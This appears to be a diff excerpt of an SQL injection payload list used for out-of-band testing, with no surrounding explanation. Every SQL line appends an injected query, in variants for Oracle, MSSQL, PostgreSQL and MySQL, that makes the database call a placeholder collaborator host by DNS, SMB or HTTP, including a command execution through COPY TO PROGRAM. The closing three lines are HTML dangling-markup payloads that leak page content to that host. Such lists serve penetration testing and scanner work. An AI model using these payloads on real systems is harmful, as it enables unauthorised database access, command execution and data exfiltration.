+` copy (SELECT '') to program 'nslookup domain_collab'--
+` LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`UNION SELECT UTL_INADDR.get_host_address('domain_collab')--
+`||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`||SELECT UTL_INADDR.get_host_address('domain_collab')--
+`||exec master..xp_dirtree '//domain_collab/a'--
+`||copy (SELECT '') to program 'nslookup domain_collab'--
+`||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`; SELECT UTL_INADDR.get_host_address('domain_collab')--
+`; exec master..xp_dirtree '//domain_collab/a'--
+`; copy (SELECT '') to program 'nslookup domain_collab'--
+`; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`) SELECT UTL_INADDR.get_host_address('domain_collab')--
+`) exec master..xp_dirtree '//domain_collab/a'--
+`) copy (SELECT '') to program 'nslookup domain_collab'--
+`) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`)) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`)) SELECT UTL_INADDR.get_host_address('domain_collab')--
+`)) exec master..xp_dirtree '//domain_collab/a'--
+`)) copy (SELECT '') to program 'nslookup domain_collab'--
+`)) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`) OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+`) OR exec master..xp_dirtree '//domain_collab/a'--
+`) OR copy (SELECT '') to program 'nslookup domain_collab'--
+`) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`)) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`)) OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+`)) OR exec master..xp_dirtree '//domain_collab/a'--
+`)) OR copy (SELECT '') to program 'nslookup domain_collab'--
+`)) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`) AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+`) AND exec master..xp_dirtree '//domain_collab/a'--
+`) AND copy (SELECT '') to program 'nslookup domain_collab'--
+`) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+`)) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`)) AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+`)) AND exec master..xp_dirtree '//domain_collab/a'--
+`)) AND copy (SELECT '') to program 'nslookup domain_collab'--
+`)) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+` OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+` OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+` OR exec master..xp_dirtree '//domain_collab/a'--
+` OR copy (SELECT '') to program 'nslookup domain_collab'--
+` OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+` AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+` AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+` AND exec master..xp_dirtree '//domain_collab/a'--
+` AND copy (SELECT '') to program 'nslookup domain_collab'--
+` AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
 "><img src='//domain_collab?
 "><img src='http://domain_collab/log.php?HTML=
 "><meta http-equiv="refresh" content='0; url=http://domain_collab/log.php?text=
